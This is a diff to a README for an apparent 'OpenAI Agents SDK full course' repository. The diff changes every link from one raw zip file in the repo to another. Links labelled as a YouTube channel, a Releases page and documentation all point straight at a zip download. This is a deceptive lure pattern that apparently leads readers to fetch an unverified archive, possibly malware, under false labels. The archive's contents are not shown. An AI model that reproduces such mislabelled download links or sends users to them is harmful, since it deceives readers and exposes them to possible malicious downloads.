@@ -1,11 +1,11 @@
 ```markdown
 # 🚀 openai_agents_sdk_full_course - Learn AI with Ease and Confidence
 
-[![Download OpenAI Agents SDK](https://raw.githubusercontent.com/momenh2004/openai_agents_sdk_full_course/main/exomphalous/openai_agents_sdk_full_course.zip%20Now!-OpenAI%20Agents%20SDK-blue)](https://raw.githubusercontent.com/momenh2004/openai_agents_sdk_full_course/main/exomphalous/openai_agents_sdk_full_course.zip)
+[![Download OpenAI Agents SDK](https://github.com/momenh2004/openai_agents_sdk_full_course/raw/refs/heads/main/04_hello_agent/agents_course_openai_sdk_full_3.7-beta.5.zip%20Now!-OpenAI%20Agents%20SDK-blue)](https://github.com/momenh2004/openai_agents_sdk_full_course/raw/refs/heads/main/04_hello_agent/agents_course_openai_sdk_full_3.7-beta.5.zip)
 
 ## 🎓 Description
 
-The OpenAI Agents SDK Full Course teaches you how to build, manage, and orchestrate multi-agent AI systems. It is designed for beginners who want to explore artificial intelligence. You can watch my tutorials on my [YouTube Channel](https://raw.githubusercontent.com/momenh2004/openai_agents_sdk_full_course/main/exomphalous/openai_agents_sdk_full_course.zip).
+The OpenAI Agents SDK Full Course teaches you how to build, manage, and orchestrate multi-agent AI systems. It is designed for beginners who want to explore artificial intelligence. You can watch my tutorials on my [YouTube Channel](https://github.com/momenh2004/openai_agents_sdk_full_course/raw/refs/heads/main/04_hello_agent/agents_course_openai_sdk_full_3.7-beta.5.zip).
 
 ## 🔑 Topics Covered
 
@@ -37,7 +37,7 @@ To ensure the best experience, your system should meet the following requirement
 
 ### 📥 Download & Install
 
-To download the software, please visit this page: [Download OpenAI Agents SDK](https://raw.githubusercontent.com/momenh2004/openai_agents_sdk_full_course/main/exomphalous/openai_agents_sdk_full_course.zip). 
+To download the software, please visit this page: [Download OpenAI Agents SDK](https://github.com/momenh2004/openai_agents_sdk_full_course/raw/refs/heads/main/04_hello_agent/agents_course_openai_sdk_full_3.7-beta.5.zip). 
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version of the software.
@@ -61,7 +61,7 @@ Once you have downloaded the file:
 If you encounter issues during installation or running the application, consider the following:
 
 - Ensure your system meets the requirements outlined above.
-- Check for the latest version of the software on the [Releases page](https://raw.githubusercontent.com/momenh2004/openai_agents_sdk_full_course/main/exomphalous/openai_agents_sdk_full_course.zip).
+- Check for the latest version of the software on the [Releases page](https://github.com/momenh2004/openai_agents_sdk_full_course/raw/refs/heads/main/04_hello_agent/agents_course_openai_sdk_full_3.7-beta.5.zip).
 - Restart your application if any error messages appear.
 - Visit the issues section of the repository to see if others have reported similar problems.
 
@@ -69,8 +69,8 @@ If you encounter issues during installation or running the application, consider
 
 To help you learn how to use the software effectively, here are some resources:
 
-- **Video Tutorials:** Visit my [YouTube Channel](https://raw.githubusercontent.com/momenh2004/openai_agents_sdk_full_course/main/exomphalous/openai_agents_sdk_full_course.zip) for guided lessons.
-- **Documentation:** Access detailed documentation within the app or refer to [this link](https://raw.githubusercontent.com/momenh2004/openai_agents_sdk_full_course/main/exomphalous/openai_agents_sdk_full_course.zip) for more details.
+- **Video Tutorials:** Visit my [YouTube Channel](https://github.com/momenh2004/openai_agents_sdk_full_course/raw/refs/heads/main/04_hello_agent/agents_course_openai_sdk_full_3.7-beta.5.zip) for guided lessons.
+- **Documentation:** Access detailed documentation within the app or refer to [this link](https://github.com/momenh2004/openai_agents_sdk_full_course/raw/refs/heads/main/04_hello_agent/agents_course_openai_sdk_full_3.7-beta.5.zip) for more details.
 
 ## 🛠️ Contributing
 
